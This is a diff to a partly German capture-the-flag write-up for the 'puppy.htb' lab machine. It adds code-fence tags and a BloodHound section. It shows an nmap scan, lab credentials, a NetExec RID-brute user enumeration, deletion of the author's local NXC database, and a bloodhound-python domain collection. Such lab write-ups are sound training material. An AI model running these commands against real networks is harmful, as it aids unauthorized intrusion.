@@ -2,7 +2,7 @@
 
 ## Initial Reconnaissance
 
-```
+```zsh
 nmap -A xx.xx.xx.xx --min-rate 10000
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-17 15:00 EDT
 Nmap scan report for xx.xx.xx.xx
@@ -29,8 +29,11 @@ PORT      STATE SERVICE      VERSION
 
 **Credentials: levi.james : KingofAkron2025!**
 
+```zsh
+rm -f /home/b2syn4p53/.nxc/workspaces/default/smb.db 
 ```
-rm -f /home/b2syn4p53/.nxc/workspaces/default/smb.db     
+
+```zsh
 nxc smb puppy.htb -u 'levi.james' -p 'KingofAkron2025!' --rid-brute | grep "SidTypeUser" | \
 awk -F '\\' '{print $2}' | awk '{print $1}' > users.txt  
 ```
@@ -38,3 +41,11 @@ Der erste Befehl löscht die NXC Workspace Datenbank.
 Der zweite Befehl enumeriert Benutzerkonten vom SMB-Server `PUPPY.HTB` über RID-Bruteforce, filtert nur tatsächliche Benutzerkonten heraus und extrahiert **Benutzernamen**, die dann in die Datei `users.txt` gespeichert werden.  **SidTypeUser sind normale AD-Benutzer.**
 
 ![cat users.txt](images/20250618060659.png)
+
+### BloodHound Enumeration
+
+```zsh
+bloodhound-python -dc dc.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' \
+-d puppy.htb -c All -o bloodhound_results.json -ns xx.xx.xx.xx
+```
+![bloodhound-result](images/20250618055654.png)
